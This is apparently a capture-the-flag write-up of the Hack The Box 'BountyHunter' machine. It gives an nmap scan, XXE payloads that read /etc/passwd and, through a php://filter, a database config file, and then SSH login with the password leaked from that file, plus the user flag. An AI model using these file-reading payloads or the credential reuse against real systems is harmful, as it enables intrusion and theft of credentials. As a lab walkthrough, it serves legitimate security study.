# BountyHunter
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/613afa1f-de50-44cd-8b0c-25fa9d6abf57)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.100 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-17 02:42 PDT
Nmap scan report for 10.10.11.100
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds
```

1. Based from the nmap results, the machine runs a web application and opens ssh login.

> WEBAPP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d55476aa-4511-4a38-ac70-f16e5f0a568c)


2. After ran dirbuster, found several dirs and files.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/498ca093-98a1-41ed-ba0b-f68309c43caf)


3. Long story short, **portal.php** AND **db.php** could be our interest.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0f7b0715-f102-44ff-b71f-03dc15d99366)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3150f267-374d-4dd8-937c-5486ea6e4577)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a36e25bd-c459-480d-be95-2b4864740626)


#### NOTES:

```
Can't access db.php file, dunno why even though the status code is 200. 
```

4. Let's start by sending random data and intercept the request using burpsuite.

> DATA TO SEND

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ed4ca98a-cc06-410b-a04a-5113303739b7)


> RESULT IN BURP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/02bd4583-bd02-4cf9-9220-69149bc0678b)


5. Interesting, our data is url encoded (judging from %3D), let's throw that to cyberchef.

> RESULT IN CYBERCHEF

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/19e5c515-9049-458e-8fc2-e1d63737a46a)


6. Interesting! Our request is formatted in xml. This should be our foothold if we can do XXE. Let's try the basic payload to test if it is vuln to XXE.

> COMMON ONE

```
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
```

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>aa</title>
	<cwe>&file;</cwe>
	<cvss>aaaa</cvss>
	<reward>80000</reward>
</bugreport>
```

7. Encode it to base64 + url. Send it afterwards.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d077e50c-6077-44f0-a540-4cd7613aace0)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3c8b5c2c-cffc-4938-9f79-bf029aa905ba)



8. Turns out, it does vulnerable to XXE.
9. Nice, this should be our foothold.
10. Noticed, we already leak the username.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0cea2752-0ecb-4f74-adee-0d95b3d43c3d)


11. Remembering that this is an Apache's server and it stores data, hence we can leak database file at `/var/www/html`. But again, for safety, we need to encode the result in base64 so there are no chars missing.

> COMMAND

```
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
```

> FULL PAYLOAD

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>aa</title>
	<cwe>&file;</cwe>
	<cvss>aaaa</cvss>
	<reward>80000</reward>
</bugreport>
```


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8d6aafd9-41ab-466a-ba93-dad92ec14a79)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c97a03f6-1872-4e89-96be-e4b4b7bdb0c4)


12. Ok, there is an assumption of `possibilites of password reuse`. Let's try run ssh to the remote server, set the username as development, and password as --> m19RoAU0hP41A1sTsq6K.

> RESULT - WE LOGGED IN

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/84736ebc-75a0-4554-b0f9-9092de21ffa7)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7204a05d-b100-4b65-bbf6-1b41f5a960ba)


## USER FLAG

```
312798040985116fe3baac54ab9f0c36
```



